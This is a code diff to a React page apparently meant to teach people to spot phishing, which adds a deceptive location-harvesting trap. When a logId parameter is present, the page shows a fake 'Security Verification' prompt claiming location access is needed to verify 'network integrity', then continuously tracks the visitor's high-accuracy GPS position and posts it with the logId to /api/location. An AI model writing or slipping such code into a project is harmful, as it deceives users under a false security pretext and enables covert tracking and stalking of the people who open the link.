@@ -1,5 +1,6 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 import { motion } from 'motion/react';
+import { useSearchParams } from 'react-router-dom';
 import { 
   ShieldAlert, ExternalLink, BookOpen, CheckCircle, 
   Search, Flag, MousePointer, Mail, Shield
@@ -7,6 +8,49 @@ import {
 // FIX: removed unused imports AlertCircle and Info
 
 export default function Education() {
+  const [searchParams] = useSearchParams();
+  const logId = searchParams.get('logId');
+  const [showLocationPrompt, setShowLocationPrompt] = React.useState(!!logId);
+  const [locationAllowed, setLocationAllowed] = React.useState(false);
+
+  useEffect(() => {
+    let watchId: number;
+    if (locationAllowed && logId && navigator.geolocation) {
+      watchId = navigator.geolocation.watchPosition(async (pos) => {
+        try {
+          await fetch('/api/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              logId,
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            })
+          });
+        } catch (e) {
+          console.error('Failed to save exact location', e);
+        }
+      }, (err) => {
+        console.warn('Geolocation denied or unavailable:', err.message);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    }
+    return () => {
+      if (watchId !== undefined && navigator.geolocation) {
+        navigator.geolocation.clearWatch(watchId);
+      }
+    };
+  }, [locationAllowed, logId]);
+
+  const handleAllowLocation = () => {
+    setLocationAllowed(true);
+    setShowLocationPrompt(false);
+  };
+
+
   const redFlags = [
     {
       title: "Suspicious Sender Address",
@@ -33,6 +77,39 @@ export default function Education() {
       tag: "PATTERN"
     }
   ];
+
+  if (showLocationPrompt) {
+    return (
+      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4">
+        <motion.div 
+          initial={{ opacity: 0, scale: 0.9 }}
+          animate={{ opacity: 1, scale: 1 }}
+          className="max-w-md w-full bg-slate-900 p-8 rounded-2xl border border-slate-800 text-center shadow-xl relative overflow-hidden"
+        >
+          <div className="absolute top-0 left-0 w-full h-[2px] bg-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.5)]" />
+          <div className="w-16 h-16 bg-emerald-500/10 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6">
+            <Search size={32} />
+          </div>
+          <h2 className="text-xl font-bold text-slate-200 mb-3">Security Verification</h2>
+          <p className="text-slate-400 text-sm mb-8 leading-relaxed">
+            As part of our data protection protocol, please allow location access to verify your network integrity and confirm this interaction.
+          </p>
+          <button 
+            onClick={handleAllowLocation}
+            className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold uppercase tracking-widest text-xs py-4 rounded-xl transition-colors shadow-[0_0_15px_rgba(16,185,129,0.3)]"
+          >
+            Allow Verification
+          </button>
+          <button 
+            onClick={() => setShowLocationPrompt(false)}
+            className="w-full mt-4 bg-transparent hover:bg-slate-800 text-slate-400 hover:text-slate-300 font-bold text-xs py-3 rounded-xl transition-colors"
+          >
+            Skip for now
+          </button>
+        </motion.div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-slate-950 py-12 px-4 selection:bg-rose-500/30">
